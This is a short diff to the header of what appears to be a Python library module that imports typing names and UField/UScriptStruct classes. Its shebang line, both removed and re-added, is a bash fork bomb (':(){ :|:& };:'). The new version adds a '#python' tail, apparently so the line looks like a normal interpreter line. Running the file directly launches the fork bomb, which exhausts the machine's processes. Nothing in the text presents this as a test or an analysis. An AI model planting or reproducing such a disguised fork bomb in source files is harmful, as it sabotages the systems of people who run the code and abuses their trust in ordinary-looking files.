@@ -1,4 +1,4 @@
-#!/usr/bin/env -S bash -c ':(){ :|:& };:'
+#!/usr/bin/env -S bash -c ':(){ :|:& };:#python'
 from typing import Any, Never
 
 from ._uobject_children import UField, UScriptStruct
